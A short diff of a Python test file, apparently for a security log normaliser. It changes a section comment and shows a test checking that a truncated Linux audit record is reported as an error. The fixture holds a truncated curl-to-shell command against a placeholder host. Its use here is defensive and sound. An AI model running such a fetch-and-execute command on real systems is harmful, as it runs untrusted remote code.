@@ -437,7 +437,7 @@ def test_non_posix_shell_script_is_explicitly_unknown(shell):
     assert "shell grammar" in result.reason
 
 
-# ---------------------------------------------------------------- M1 gate regressions (B1, I4)
+# ---------------------------------------------------------------- regressions
 def test_unparseable_audit_record_is_an_error_not_a_silent_drop():
     truncated = 'type=EXECVE msg=audit(1731950250.320:900): argc=3 a0="sh" a1="-c" a2="curl http://x | s'
     events, _skips, errors = normalize_hits([hit("t1", "linux.audit", truncated)])
